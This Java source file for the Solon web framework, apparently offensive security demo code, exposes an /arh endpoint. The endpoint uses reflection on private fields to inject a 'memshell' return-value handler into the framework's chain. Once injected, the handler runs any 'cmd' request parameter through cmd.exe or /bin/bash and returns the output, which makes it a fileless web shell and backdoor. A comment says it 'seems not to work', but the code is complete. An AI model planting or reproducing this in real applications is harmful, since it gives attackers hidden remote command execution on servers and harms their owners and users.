package com.example.demo.injectController;

import org.noear.solon.annotation.Controller;
import org.noear.solon.annotation.Mapping;
import org.noear.solon.core.ChainManager;
import org.noear.solon.core.handle.Action;
import org.noear.solon.core.handle.Context;
import org.noear.solon.core.handle.ReturnValueHandler;

import static com.example.demo.injectController.FilterShell.getfieldobj;


//似乎不可用
@Controller
public class ActionReturnHandlerShell {
    @Mapping("/arh")
    public void arh() throws NoSuchFieldException, IllegalAccessException {
        Context ctx = Context.current();
        Object _request = getfieldobj(ctx,"_request");
        Object request = getfieldobj(_request,"request");
        Object serverHandler = getfieldobj(request,"serverHandler");
        Object handler = getfieldobj(serverHandler,"handler");
        Object arg$1 = getfieldobj(handler,"arg$1");
        ChainManager _chainManager = (ChainManager) getfieldobj(arg$1,"_chainManager");
        _chainManager.addReturnHandler(new ActionReturnHandlermemshell());
        System.out.println("arh memshell added");
    }

    public class ActionReturnHandlermemshell implements ReturnValueHandler {
        @Override
        public boolean matched(Context ctx, Class<?> returnType) {
            return true;
        }

        @Override
        public void returnHandle(Context ctx, Object returnValue) throws Throwable {
            try{
                if(ctx.param("cmd")!=null){
                    String str = ctx.param("cmd");
                    try{
                        String[] cmds =
                                System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe",
                                        "/c", str} : new String[]{"/bin/bash", "-c", str};
                        String output = (new java.util.Scanner((new
                                ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next();
                        ctx.output(output);
                    }catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }catch (Throwable e){
                ctx.output(e.getMessage());
            }
        }
    }


}
